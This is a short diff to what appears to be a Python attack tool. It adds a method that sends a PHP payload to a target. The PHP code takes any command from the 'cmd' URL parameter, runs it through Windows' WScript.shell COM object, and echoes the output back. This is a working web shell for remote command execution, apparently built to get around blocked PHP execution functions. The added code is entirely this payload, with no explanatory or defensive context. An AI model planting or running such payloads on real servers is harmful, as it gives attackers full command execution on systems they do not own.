@@ -148,3 +148,15 @@ $f2 = "bbbb";
 var_dump($o);
 """
         self.shell(code)
+
+    def win_system(self):
+        code = """
+$command=$_GET['cmd'];
+$wsh = new COM('WScript.shell');
+$exec = $wsh->exec("cmd /c ".$command);
+$stdout = $exec->StdOut();
+$stroutput = $stdout->ReadAll();
+// if needed
+$stroutput = iconv("GBK", "UTF-8", $stroutput); 
+echo $stroutput;"""
+        self.shell(code)
